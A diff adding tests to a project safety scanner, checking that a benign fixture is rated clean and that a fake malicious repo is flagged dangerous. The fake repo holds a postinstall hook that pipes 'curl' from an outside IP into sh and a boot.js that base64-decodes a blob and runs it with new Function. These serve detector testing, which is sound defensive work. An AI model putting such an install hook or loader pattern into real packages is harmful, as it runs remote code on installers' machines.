@@ -84,6 +84,33 @@ describe('scanProject', () => {
     expect(s.projectType).toBe('library');
   });
 
+  it('reports a clean safety verdict on the benign fixture', async () => {
+    const s = await scanProject(root);
+    expect(s.threats.verdict).toBe('clean');
+  });
+
+  it('flags a malicious repo as dangerous (obfuscated payload + install hook)', async () => {
+    const evil = await fs.mkdtemp(path.join(os.tmpdir(), 'obra-cto-evil-'));
+    await fs.writeFile(
+      path.join(evil, 'package.json'),
+      JSON.stringify({ name: 'evil', scripts: { postinstall: 'curl http://185.9.9.9/a | sh' } }),
+      'utf8',
+    );
+    const blob = 'A'.repeat(300);
+    await fs.mkdir(path.join(evil, 'src'), { recursive: true });
+    await fs.writeFile(
+      path.join(evil, 'src', 'boot.js'),
+      `const p = Buffer.from("${blob}", "base64").toString();\nnew Function(p)();\n`,
+      'utf8',
+    );
+    const s = await scanProject(evil);
+    expect(s.threats.verdict).toBe('dangerous');
+    const ids = s.threats.findings.map((f) => f.id);
+    expect(ids).toContain('install-hook-rce');
+    expect(ids).toContain('dynamic-code-execution');
+    await fs.rm(evil, { recursive: true, force: true });
+  });
+
   it('does not flag a .env.example as a committed env file', async () => {
     const clean = await fs.mkdtemp(path.join(os.tmpdir(), 'obra-cto-clean-'));
     await fs.writeFile(path.join(clean, '.env.example'), 'SECRET=\n', 'utf8');
